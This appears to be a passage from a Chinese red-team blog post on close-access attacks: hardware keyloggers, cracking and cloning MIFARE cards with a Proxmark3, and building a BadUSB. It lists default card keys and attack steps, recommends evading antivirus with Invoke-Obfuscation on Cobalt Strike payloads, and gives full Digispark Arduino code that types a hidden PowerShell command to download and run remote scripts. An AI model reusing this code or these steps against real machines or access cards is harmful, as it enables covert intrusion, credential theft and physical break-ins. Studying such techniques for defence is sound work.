<h3 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h3><p>和软件的键盘记录器一样，它会记录下用户在键盘上的所有输入，比如账号密码、网址、手机号等等，硬件版本的独特之处在于：即使现在各种防御措施，已经能防御大多数软件键盘记录器，但是基于硬件的键盘记录器，对于操作系统来说是无感知的，毕竟它就是一个标准的输入设备。识别和防御也就变得十分困难了。</p>
<p>如何得到这样一个利器，国内外的平台上都有买现成的成品，不过价格略贵，某强北的价格是210块钱左右，这个算是比较亲民的了，而国外一些专门卖这种设备的平台，一个就要一两百美刀或者欧元，巨贵，还不如噶我腰子，当然也有很多开源项目，如果懂硬件的大表哥可以自己买开发板制作，成本直接下降一大半，开源设计有spacehuhn的wifi_keylogger：<a href="https://github.com/spacehuhn/wifi_keylogger%EF%BC%8C%E4%BB%A5wifi_keylogger%E4%B8%BA%E4%BE%8B%EF%BC%8C%E5%AE%83%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8EArduino%E7%9A%84%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%E3%80%82%E5%B8%A6%E6%9C%89Wi-Fi%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%AD%98%E5%82%A8%E8%AE%B0%E5%BD%95%E5%88%B0%E7%9A%84%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%EF%BC%8C%E5%B9%B6%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%85%B6%E5%8F%91%E5%87%BA%E7%9A%84Wi-Fi%E7%BD%91%E7%BB%9C%E6%9F%A5%E7%9C%8B%E8%AE%B0%E5%BD%95%E6%95%B0%E6%8D%AE%E3%80%82">https://github.com/spacehuhn/wifi_keylogger，以wifi_keylogger为例，它是一个基于Arduino的键盘记录器。带有Wi-Fi功能，可以存储记录到的键盘输入，并可以通过其发出的Wi-Fi网络查看记录数据。</a></p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220708163027875.png" alt="image-20220708163027875"></p>
<p>看起来好像挺大的，好像装到电脑后面马上就会被发现，原因是因为USB键盘使用了HID协议，对于Arduino来说，速度太快没办法读取，所以除了使用Arduino，还需要使用其它的设备用于读取HID协议，也就是USB Host Shield，原作者通过用转换器将USB转换成PS2的键盘，然后通过分析PS2的协议读取HID的协议，虽然解决了速度问题，但是缺点就是太大了，而且会造成不兼容的问题，例如键盘上有一些按键用不了之类的，那如果要解决这类问题的话，其实可以更换芯片，然后重新设计PCB，但是这种太过复杂（对会的人来说可能挺简单的），但是对于我们这种只是想要短时间内马上就能用到，并且有成效的话，总不能还要我去学吧？所以这里的话，建议大家买现成的，资源自寻百度（狗头保命）</p>
<h2 id="Proxmark-3"><a href="#Proxmark-3" class="headerlink" title="Proxmark 3"></a>Proxmark 3</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>Proxmark3是一款国外安全团队研发的开源设备，内置高频和低频天线，能够识别和读取大部分的RFID卡片，而且国内的PM3还可以通过转接头等工具和手机电脑连接，达到跨平台的效果，日常用的卡片有两种，一种是ID卡，一种是IC卡，ID卡内的卡号读取很容易，不需要权限，所以很容易仿制，而IC卡内的数据读取需要权限认证，有些IC卡的每个扇区都有不同的认证密码，所以破解难度会相对较高，但是由于IC卡中存在伪随机数发生器，造成了一定的安全问题，而Proxmark3和其他的读卡设备可以自由控制线圈通电时间，从而绕过部分安全验证，破解出IC卡的密码。</p>
<p>例如这种16扇区，64扇块的M1卡，内部的数据存储形式是这样的</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220708171121280.png" alt="image-20220708171121280"></p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220708171134879.png" alt="image-20220708171134879"></p>
<p>常用的M1卡主要有NXP生产的S50和S70，都是属于MifareClassic家族。以S50为例，国内兼容的最好的厂家是上海复旦微电子生产的FM11RF08芯片，二者的区别在控制位上，控制位主要是读卡器在验证卡的时候所用到的，不同的控制位表示不同的验证方式，NXP的S50前15个扇区的密码块的控制位是：“FF078069”，最后1个扇区的密码快的控制位是：“FF0780BC”。</p>
<p>而复旦FM11RF08芯片的所有扇区的所有控制位均为：“FF078069”。接着就是看芯片第0扇区第0块的代码，从第10位开始看，如果后面是“08040062636”就是复旦的芯片，而如果是“08040023569”就是贝岭芯片。</p>
<p>MifareClassic 1k共有16个扇区，分别为0-15个扇区；每个扇区有4块，分别为0-3块，每个块有32个字符；0扇区的0块为只读块，只存储厂商代码和UD号。</p>
<p>其他每个扇区的前3块为数据库，最后一块为密码块。密码块的前12个字符为A区密码，中间8个字符为控制位，后面12个字符为B区密码。</p>
<h3 id="默认口令爆破"><a href="#默认口令爆破" class="headerlink" title="默认口令爆破"></a>默认口令爆破</h3><p>IC卡在制造时制造厂商为了方便会将除0扇区之外的扇区的所有密码默认设置为FFFFFFFFFFFF，这就是IC卡片的默认密码，所以可以使用PM3对卡片的默认密码进行爆破。早期的PM3要把高频天线连接到Proxmark3的天线接口，并且连接完成之后要查看一下天线与PM3连接之后的工作电压是否正常；国产的PM3工具在设计时就将高频天线和低频天线安装到一起，在使用时只需要实用工具对其电压等进行探测是否正常。</p>
<p>这里简要说下过程，如果想要看图的话，可以自行百度，网上也有教程</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#工具准备</span></span><br><span class="line"><span class="attribute">Proxmark3</span></span><br><span class="line"><span class="attribute">IC</span>卡片</span><br><span class="line"><span class="attribute">Proxmark3</span> Easy GUI</span><br><span class="line"><span class="comment">#实施过程</span></span><br><span class="line"><span class="attribute">1</span>、先用数据线将Proxmark<span class="number">3</span>和电脑连接，然后找到相对应的串口，连接成功后检测下工作电压</span><br><span class="line"><span class="attribute">2</span>、把准备好的IC卡放到高频卡读卡器位置，查看天线电压的变化，如果高频天线的电压下降了，说明我们买到的是高频IC卡，先读取卡片类型</span><br><span class="line"><span class="attribute">3</span>、先检测是否存在出厂时遗留的key，默认key有</span><br><span class="line"><span class="attribute">nffffffffffff</span></span><br><span class="line"><span class="attribute">nbob1b2b3b4b5</span></span><br><span class="line"><span class="attribute">n000000000000</span></span><br><span class="line"><span class="attribute">na0ala2a3a4a5</span></span><br><span class="line"><span class="attribute">naabbccddeeff</span></span><br><span class="line"><span class="attribute">n714c5c886e97</span></span><br><span class="line"><span class="attribute">na0478cc39091</span></span><br><span class="line"><span class="attribute">4</span>、通过默认密码扫描，看能不能读取到某个扇区的密码</span><br><span class="line"><span class="attribute">5</span>、利用嵌套认证漏洞使用任何一个扇区的已知密匙，获取所有扇区的密匙，此漏洞成功率较高，这个漏洞也被称作知一密求全密，如果从上一步中已经知道其中的几个扇区的默认密码，使用PM<span class="number">3</span>的知一密求全密的功能对扇区进行破解</span><br><span class="line"><span class="attribute">6</span>、如果上面的方式不行，那就使用PRNG漏洞进行破解，Proxmark<span class="number">3</span>基于PRNG的安全缺陷是进行随机数碰撞，利用PRNG的安全缺陷我们可以很快速地得到对应的密钥，从而进行进一步的破解操作。</span><br><span class="line"><span class="comment">#MIFARE Classic采用的是Crypto-1私有加密算法，其算法的特点就是对称式的密码算法或者说是私钥密码系统。其主要组成部分是伪随机数发生器（PRNG）、48位的线性反馈移位寄存器（LFSR）以及非线性函数。由于算法当中的Filter Function的设计出现缺陷，导致改变线性反馈移位寄存器的后8位数值就有可能得到所对应的Keystream。这个缺陷类似于802.11bWEP算法，不同的明文有极高的可能性被相同的Keystream，使得整个加密算法出现了漏洞。</span></span><br><span class="line"><span class="attribute">7</span>、如果上面两种方式都不行，也可以尝试RFID嗅探，RFID嗅探也是一种非常常见的RFID攻击方式，对于一些卡片无法使用默认密码或者PRNG漏洞攻破其密码，但是仍然可以使用嗅探的方式对其进行攻击，从而嗅探出密码。</span><br><span class="line"><span class="attribute">8</span>、破解完就是复制卡片了，没啥难度</span><br></pre></td></tr></table></figure>

<h2 id="Badusb"><a href="#Badusb" class="headerlink" title="Badusb"></a>Badusb</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>Badusb，也就是利用HID接口的类似于U盘的东西，HID（人体学接口设备）是一个设备类定义，用于将 PS/2 样式的连接器替换为支持 HID 设备（例如键盘、鼠标、游戏控制器等）的通用USB 驱动程序，在 HID 之前，设备只能对鼠标和键盘使用严格定义的协议。硬件创新要求使用现有协议重载数据，或使用其自己的专用驱动程序创建非标准硬件， HID为这些“启动模式”设备提供了支持，同时通过可扩展、标准化且易于编程的接口添加对硬件创新的支持。简单来说HID设备就是键盘这种输入设备 而HID攻击呢，其实就是指利用模拟键盘的输入进行的攻击，其内部结构是这样的</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220710160831095.png" alt="image-20220710160831095"></p>
<p>从这张图便可以了解到Badusb和普通的U盘并没有什么两样，因此迷惑性极高，很容易攻击成功，在2014年美国黑帽大会上，安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
<p>Badusb插入后，会模拟键盘对电脑进行操作，通过这些操作打开电脑的命令终端，并执行一条命令，这条命令将从指定网址下载恶意代码(通常为powershell脚本)并于后台静默运行。这些代码功能包括：窃取信息、反弹shell、发送邮件等，从而实现控制目标机或者窃取信息的目的。</p>
<p>关于硬件，各大平台都有在卖现成的，例如万能的某宝，某鱼，或者Hak5，Hak5上面的价格十分《亲民》谨慎购买，橡皮鸭算是上面比较亲民的了50刀的样子，毕竟实际攻防的时候，丢地上最后去哪了都不知道，血亏几百刀。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220718145147795.png" alt="image-20220718145147795"></p>
<h3 id="自制Badusb"><a href="#自制Badusb" class="headerlink" title="自制Badusb"></a>自制Badusb</h3><p>别人能做那当然也可以自己制作，熟悉Arduino的大佬，完全可以自己买块开发板回来自己烧录，而且网上有现成的教程和代码，直接CCV就行了。</p>
<h4 id="开发板烧录过程"><a href="#开发板烧录过程" class="headerlink" title="开发板烧录过程"></a>开发板烧录过程</h4><p>1、买个经典版的橡皮鸭rubber ducky（其他开发板也可以）<br>2、在CS上面生成个ps1文件格式Powershell可执行的程序<br>3、对CS生成的Ps文件进行免杀（这里可以用Invoke-Obfuscation进行免杀，<a href="https://github.com/danielbohannon/Invoke-Obfuscation%EF%BC%89">https://github.com/danielbohannon/Invoke-Obfuscation）</a><br>4、安装Digispark （Attiny85）开发板驱动。</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220719162400830.png" alt="image-20220719162400830"></p>
<p>5、打开Arduino软件，点击文件中的首选项，附加开发板管理器网址填入：<a href="https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json">https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json</a></p>
<p>6、点击工具中的开发板中的开发板管理器，等待下载索引完成（下载不成功请使用海外代理），搜索并安装“Digistump AVR Boards by Digistump”，安装完成后在开发板中选择Digispark（Default-16.5mhz）</p>
<p><img src="https://ax-x.github.io/2022/07/19/%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220719162553999.png" alt="image-20220719162553999"></p>
<p>7、将以下代码填入Arduino代码框中，以实现伪造键盘输出win+r打开运行窗口并执行Powershell命令：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span>&#123;<span class="comment">//初始化 </span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯 </span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时 </span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键 </span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">delay</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#x27;http://8.8.8.8/main.ps1&#x27;) &quot;</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯 </span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯 </span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时 </span></span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键 </span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"><span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">delay</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#x27;http://8.8.8.8/payload.ps1&#x27;) &quot;</span>);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_RETURN); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_RETURN);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK); </span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>8、将代码上传到开发板中，等待烧录完成即可，烧录成功之后，插入电脑即可上线</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>近源渗透相比普通的渗透测试可能成本更高，毕竟一个设备动不动就要一两百美刀，谁顶得住啊，但是如果能更好的掌握社工技巧会事半功倍，而且对于蓝队来说更是防不胜防，有可能自己在网络这块防得死死的，被现场的好队友捡到的u盘送走了，虽然设备费用贵，但贵有贵的道理，从另一个方面讲，以后的常规渗透测试肯定也会越来越多的结合近源渗透测试的一些手段和方法，这不仅仅是提高了红队的攻击能力，同时也是对蓝队防守能力在更高维度上提出了要求。</p>
]]></content>
      <categories>
        <category>近源攻击</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>近源攻击</tag>
      </tags>
  </entry>
</search>
